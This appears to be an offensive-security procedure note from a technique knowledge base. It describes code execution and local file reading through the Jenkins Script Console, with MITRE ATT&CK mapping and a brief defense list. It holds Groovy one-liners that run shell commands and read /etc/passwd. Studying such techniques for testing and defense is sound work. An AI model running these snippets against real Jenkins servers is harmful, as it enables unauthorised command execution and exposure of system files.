---
tags:
  - rce
  - lfi
  - groovy
  - jenkins
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Server
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:31:52.706Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 9e99be75-a105-4213-a483-62143735c8c1
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[File and Directory Discovery]]'
---
# Execute-Arbitrary-Code-via-Script-Console

## Summary

This procedure uses the Jenkins Script Console to execute arbitrary Groovy code, achieving RCE and LFI on the test instance.

## Description

The Script Console runs code in the Jenkins JVM context, allowing system command execution and file reads. Impacts are limited to test resources, with no production access.

## Requirements

1. Access to the Script Console
2. Knowledge of Groovy scripting
3. Target file paths for LFI

## Defense

Defensive measures and detection strategies:

- Remove Script Console or require approval for executions
- Run Jenkins in isolated containers
- Monitor JVM processes and file accesses

## Objectives

1. Run system commands for RCE
2. Include and read local files
3. Confirm environment limitations

## Instructions

### Step 1: Execute RCE Script

**Context**: Input Groovy code to run shell commands.

In the console, enter: def proc = "whoami".execute(); proc.waitFor(); println proc.text

**Expected Output**: Output of the command, e.g., Jenkins user.

### Step 2: Perform LFI

**Context**: Read arbitrary local files.

Enter: println new File('/etc/passwd').text (adjust path as needed).

**Expected Output**: File contents displayed in the console.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[lfi]]
